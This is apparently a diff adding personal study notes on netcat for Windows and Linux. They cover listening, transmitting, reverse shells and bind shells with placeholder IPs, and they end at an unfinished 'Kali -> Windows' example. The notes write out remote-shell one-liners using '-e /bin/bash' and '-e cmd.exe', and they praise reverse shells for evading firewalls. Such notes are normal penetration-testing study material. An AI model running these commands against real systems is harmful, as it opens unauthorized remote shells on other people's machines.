@@ -1,0 +1,44 @@
+windows netcat cmds:
+nc.exe -h -> help for man page
+
+nc.exe -nvLp [port] -> listens on port
+nc.exe -nv [ip] [port] -> transmits data to ip and port
+nc.exe -nv [ip] [port] -e cmd.exe -> sends reverse shell
+
+linux netcat cmds:
+man nc -> manual page for netcat
+
+nc -nv [ip] [port] -> transmits
+nc -nvlp [port] -> listens
+nc -nv [ip] [port] -e /bin/bash -> sends reverse shell
+
+reverse shell:
+shell is transmitted. 
+
+ex.
+winbox: nc.exe -nvLp [port]
+linuxbox: nc -nv [ip] [port] -e /bin/bash
+winbox: gains shell on linux box
+
+This flow can be reversed to transmit shell from a windows box or linux box.
+Reverse shells are great for evading windows firewalls, since usually communications are blocked inwards but not outwards. 
+
+bind shell:
+shell is binded during listen command.
+
+ex.
+linuxbox: nc -nvlp [port] -e /bin/bash
+winbox: nc.exe -nv [ip] [port] 
+winbox: gains shell on linux box
+
+Important to note now that the difference between reverse and bind shell. During listening phase in the flow, instead of just specifying a port to listen. It calls up the shell to be binded on that port. Any computer that then connects to the box on that port will gain a shell on the machine listening. Usually does not work when a firewall is present due to the need to recieve connections.
+
+Examples of reverse shells:
+
+Kali -> Windows:
+
+nc
+
+
+
+ 
